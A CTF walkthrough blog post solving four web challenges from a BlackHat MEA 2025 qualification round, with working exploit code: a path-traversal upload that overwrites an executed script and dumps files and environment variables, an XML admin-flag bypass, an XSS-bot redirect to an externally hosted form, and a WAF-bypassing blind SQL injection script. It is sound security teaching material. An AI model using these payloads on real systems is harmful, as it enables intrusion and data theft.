---
title: Blackhat MEA 2025 Qualification
date: 2025-09-07
categories: [CTF Walkthrough]
tags: Web CTF
img_path: assets/CTF/BlackhatQual2025/image.png
image:
  path: assets/CTF/BlackhatQual2025/image.png
---

This blog covers all web application challenges from the **BlackHat 2025 Qualification Round**. Each challenge contains a description, the vulnerable code, and steps to exploit it. It serves as a complete walkthrough of the web challenges in this competition.

## Challenge1: Hash Generator

This is a small Flask app that accepts hash files, attempts to crack them, and returns results. It stores uploaded files in a `hashes` directory and executes a local script `/app/crack` to process them.


Before moving on, quickly set up the environment locally:

Add this line **before `USER app`** in the Dockerfile to create a dummy flag for testing:

```dockerfile
RUN echo "LOCALFLAG{test_flag_123}" > /flag
```

Build and run the container:

```bash
docker build -t hash-factory .
docker run -it --rm -p 5000:5000 hash-factory
```


### Vulnerable Code

In `main.py`:

```python
hash_file.save(path := hashes / hash_file.filename)
```

* `hash_file.filename` comes **directly from the user**.
* You can supply `../crack` as the filename.
* This **escapes the `hashes` directory** and overwrites the `/app/crack` script.


### How it gets compromised

Later in the code:

```python
crack_results = check_output(["/app/crack", path], text=True)
```

* The app executes `/app/crack` for every uploaded file.
* By overwriting `/app/crack` with your own Python script, the server now executes your code instead of the original hash cracker.


### Exploit script

Create a file `crack.py` with the following content:

```python
#!/usr/bin/env python3
import os

print("hash_factory v1.0:")

flag_path = "/app/flag"

try:
    with open(flag_path, "r") as f:
        print(f.read().strip())
except FileNotFoundError:
    print("[fallback] listing / and env...")
    print("\n".join(os.listdir("/")))
    for k, v in os.environ.items():
        print(f"{k}={v}")
```

Use `curl` to overwrite `/app/crack` and get the flag:

```bash
curl -s -F 'hash_file=@crack.py;filename=../crack' http://127.0.0.1:5000/
```

**Output:**

```html
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css" />
<div style="width:48rem;margin:2rem auto;"><pre>hash_factory v1.0:
LOCALFLAG{test_flag_123}
</pre></div>
```

## Challenge2: Go-brr

This challenge is a web application that combines a Go-based authentication service and a Flask frontend. The goal is to bypass the admin check and retrieve the flag.


Build and run the app locally:

```bash
docker-compose build
docker build -t go-brr-app .
docker-compose up
```

Now the application should be running:

<img src="assets/CTF/BlackhatQual2025/image1.png" alt="Application running"/>


### Vulnerability Explanation

The Go `User` struct

```go
type User struct {
    Username string `json:"username" xml:"username"`
    Password string `json:"password" xml:"password"`
    IsAdmin  bool   `json:"-"  xml:"-,omitempty"`
}
```

* `IsAdmin` is **not supposed to come from XML or JSON**.
* However, **Go's `encoding/xml` can be tricked** with a malformed XML tag like:

```xml
<A:->True</A:->
```

* Normally, Go ignores unknown fields, but a specially crafted XML can populate private or omitted fields (`IsAdmin`).

Example payload:

```xml
<User>
  <username>alice</username>
  <password>supersecret</password>
  >
  <A:->True</A:->
</User>
```

**This sets `IsAdmin = true` internally.**

---

### Flask trusts Go

```python
check = requests.post(auth_service_url, json=data).text
if check == '"Authorized"':
    session['is_admin'] = True
```

* Once Go returns `"Authorized"`, Flask sets `session['is_admin'] = True`.
* The session now grants admin privileges.

---

### Creating a user

* Intercept a request to `/user`, change it to `POST` and set `Content-Type` to `application/json`.

<img src="assets/CTF/BlackhatQual2025/image2.png" alt="Creating user"/>

* After this request, the session is marked as admin.

---

### Access `/admin`

* Flask checks only `session['is_admin']` for `/admin`.
* By opening the request in the browser and changing `/user` → `/admin`, you can access the admin route and retrieve the flag:

<img src="assets/CTF/BlackhatQual2025/image3.png" alt="Access admin"/>



## Challenge3:  Cute csp

The challenge provides a simple PHP web application running in Docker. It includes:

- `index.php` – main page that reflects user-controlled HTML.
- `report.php` – a page where a simulated “XSS bot” (Headless Chrome) visits the supplied URL.
- `admin.php` – contains sensitive information (`ADMIN_TOKEN`).
- A dynamic environment variable `DYN_FLAG` set in the Docker container (the real flag).

Before moving on, quickly set up the environment locally:

```
docker-compose build
docker build -t cute-csp-app .
docker-compose up
```

### Vulnerable Components

**report.php**
```php
$url = $_REQUEST['url'] ?? null;
if (isset($url) && str_starts_with($url, URL_PREFIX)) {
    $url = escapeshellarg($url);
    system("python3 bot.py " . $url);
}
````

* Restricts requests to `http://localhost:5000/index.php`.
* Simply shells out to `bot.py` with user-controlled input.

**index.php**

```php
@print($_GET["html"] ?? show_source(__FILE__));
```

* Reflects arbitrary HTML provided via the `html` parameter.
* No sanitization → we can inject `<meta http-equiv="refresh">` or other redirect tricks.

**bot.py**

```python
await context.add_cookies([
  {"name": "token", "value": ADMIN_TOKEN, "domain": "localhost", "httpOnly": True, "path": "/"}
])
await page.goto(url)
```

* Simulates an admin browser.
* Visits attacker-controlled pages under `http://localhost:5000/index.php?...` with the admin token cookie set.
* Effectively acts as an XSS bot with high privileges.

**admin.php**

```php
$txs = @yaml_parse_url($url);
...
foreach ($currency_inventory as $cur => $qty) {
    printf("Final Inventory %-5s : %s\n", $cur, $cur === 'FL' ? getenv('DYN_FLAG') : $qty);
}
```

* Processes transactions from a URL.
* Returns `DYN_FLAG` for currency `FL` if manipulated correctly.


### Exploit Flow

Host exploit HTML (`exploit.html`) somewhere publicly accessible. Locally, you can use a Python server:

```
┌──(kali㉿kali)-[~/blackhat/writeup/cute_csp/src]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.20.0.2 - - [09/Sep/2025 14:02:37] "GET /exploit.html HTTP/1.1" 200 -
```

For the challenge, host it using GitHub Pages:

```
https://furious-05.github.io/cute_css/exploit.html
```

Example `exploit.html`:

```
<!doctype html>
<meta charset="utf-8">
<form id="f" action="http://localhost:5000/admin.php" method="POST">
  <input type="hidden" name="url"
    value="http://localhost:5000/admin.php/../index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
</form>
<script>f.submit()</script>
```

Trigger the bot using report.php:

**Locally:**

```
curl -vv "http://127.0.0.1:5000/report.php?url=http://localhost:5000/index.php?html=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttp://172.17.0.1:8000/poc.html%22%3E"
```

**In the lab:**

```
curl -vv "http://twf2zxixy2s-0.playat.flagyard.com/report.php?url=http://localhost:5000/index.php?html=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttps%3A%2F%2Ffurious-05.github.io%2Fcute_css%2Fexploit.html%22%3E"

```

**Flow:**

- The bot loads `index.php`.

- The meta refresh redirects it to our hosted` exploit.html`.

- `exploit.html` submits a request to `admin.php` with our crafted YAML payload.

- `admin.php` processes the transactions and prints the flag from `DYN_FLAG`.




```
┌──(kali㉿kali)-[~/blackhat/writeup/cute_csp/src]
└─$ curl -vv "http://127.0.0.1:5000/report.php?url=http://localhost:5000/index.php?html=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttp://172.17.0.1:8000/poc.html%22%3E"

14:02:36.977378 [0-0] * [SETUP] added
14:02:36.977576 [0-0] *   Trying 127.0.0.1:5000...
14:02:36.977811 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
14:02:36.978600 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
14:02:36.978633 [0-0] * Connected to 127.0.0.1 (127.0.0.1) port 5000
14:02:36.978699 [0-0] * using HTTP/1.x
14:02:36.978834 [0-0] > GET /report.php?url=http://localhost:5000/index.php?html=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttp://172.17.0.1:8000/poc.html%22%3E HTTP/1.1
14:02:36.978834 [0-0] > Host: 127.0.0.1:5000
14:02:36.978834 [0-0] > User-Agent: curl/8.14.1
14:02:36.978834 [0-0] > Accept: */*
14:02:36.978834 [0-0] > 
14:02:36.978975 [0-0] * Request completely sent off
14:02:39.536714 [0-0] < HTTP/1.1 200 OK
14:02:39.537373 [0-0] < Date: Tue, 09 Sep 2025 14:02:36 GMT
14:02:39.537716 [0-0] < Server: Apache/2.4.65 (Debian)
14:02:39.538040 [0-0] < X-Powered-By: PHP/8.3.25
14:02:39.538353 [0-0] < Vary: Accept-Encoding
14:02:39.538730 [0-0] < Transfer-Encoding: chunked
14:02:39.539021 [0-0] < Content-Type: text/html; charset=UTF-8
14:02:39.539312 [0-0] < 
<pre>[xssbot] visiting url
--------------------------------
<head></head><body><pre>11111
fgc- amount: 1000000
  currency: ZZZ
  op: BUY
- amount: 1000000
  currency: ZZZ
  op: SELL
- amount: 1
  currency: FL
  op: BUY

22222
urlhttp://localhost:5000/admin.php/../index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A
33333
Transactions Processing Sheet
--------------------------
- 1000000x ZZZ (Rate: 0.0) =   0
+ 1000000x ZZZ (Rate: 0.0) =   0
-  1x FL (Rate: 1000000.0) = 1000000
Final Inventory ZZZ   : 0
Final Inventory FL    : BHFlagY{this_is_a_flag}

</pre></body>
--------------------------------
[xssbot] complete
14:02:39.589087 [0-0] * Connection #0 to host 127.0.0.1 left intact
[xssbot] total request time: 2.6081161499023 seconds</pre>
```


## Challenge4: Koko WAF 

Koko WAF is a web application protected by a naive regex-based WAF. The goal of this challenge is to **bypass the WAF** and extract the flag stored in `/init.db`.

Before starting, build and launch the Docker environment:

```bash
docker-compose build
docker-compose up
```

This will start the vulnerable application on `http://localhost:5008`.

---

### Vulnerable Code

The application has several pages, including `index.php` (login), `register.php`, and `profile.php`.

In `index.php`, the relevant login code is:

```php
if(!empty($_POST['username']) && !empty($_POST['password'])) {
    $username = $_POST['username'];
    $password = sha1($_POST['password']);
    
    if(waf($username)) {
        $error_message = "WAF Block - Invalid input detected";
    } else {
        $res = $conn->query("SELECT * FROM users WHERE username='$username' AND password='$password'");
        if($res->num_rows === 1) {
            $_SESSION['username'] = $username;
            $_SESSION['logged_in'] = true;
            header("Location: profile.php");
            exit();
        } else {
            $error_message = "Invalid username or password";
        }
    }
}
```

### WAF Details

* The `waf.php` file applies regex-based filters to the `username` parameter.
* It blocks **quotes**, **logical operators**, **SQL keywords**, **comments**, and **whitespace**.
* However, the WAF can be **bypassed** with carefully crafted payloads.

---

#### Exploit Strategy

We use a **time-based blind SQL injection** approach:

1. The flag is stored in `/init.db`.
2. The WAF blocks normal SQL injection patterns, so we rely on **time delays**.
3. The idea is to craft a payload that causes the database to sleep when a guessed character matches.
4. Measure the response time to confirm each character of the flag.

---

### Exploit Script

```python
#!/usr/bin/env python3
import requests
import time

URL = "http://localhost:5008/index.php"
SESSION = requests.Session()

# Configuration for the challenge
SLEEP_TIME = 3
THRESHOLD = 2.0   # if response > threshold → condition true
CHARS = "0123456789abcdef}"
FLAG = "BHFlagY{"   # known prefix

# Payload template for time-based blind SQL injection
payload_template = (
    "'" * 78095 +
    "+IF(ASCII(SUBSTRING(LOAD_FILE('/init.db'),{pos},1))={char},SLEEP({delay}),0)#"
)

def send_payload(payload):
    start = time.time()
    SESSION.post(URL, data={
        "username": payload,
        "password": "x",
        "login-submit": "1"
    })
    return time.time() - start

def extract_flag():
    global FLAG
    while not FLAG.endswith("}"):
        pos = 1012 + len(FLAG)  # offset where the flag starts in /init.db
        for c in CHARS:
            payload = payload_template.format(pos=pos, char=ord(c), delay=SLEEP_TIME)
            elapsed = send_payload(payload)
            if elapsed > THRESHOLD:
                FLAG += c
                print(f"[+] Found char: {c} → {FLAG}")
                break
        else:
            print("[-] No character matched, stopping.")
            break
    return FLAG

if __name__ == "__main__":
    print("[*] Extracting flag...")
    flag = extract_flag()
    print(f"[!] Final FLAG = {flag}")
```

---

## Script Logic

1. **Known prefix:** The script starts with `FLAG = "BHFlagY{"`.
2. **Position calculation:** For each iteration, `pos = 1012 + len(FLAG)` points to the next character in the database file.
3. **Character loop:** The script tries each character in `CHARS = "0123456789abcdef}"`.
4. **Payload injection:** Each guess is injected into the `username` field.
5. **Timing check:** If the response time exceeds `THRESHOLD` (2 seconds), the guess is correct.
6. **Append & continue:** Add the correct character to `FLAG` and repeat until `}` is found.

---

## Note

Challenge files for this Qualification Round can be accessed here: [BlackHat Qual 2025](https://github.com/furious-05/CTF-Writeups/tree/main/Web%20Exploitation/BlackhatQual%202025)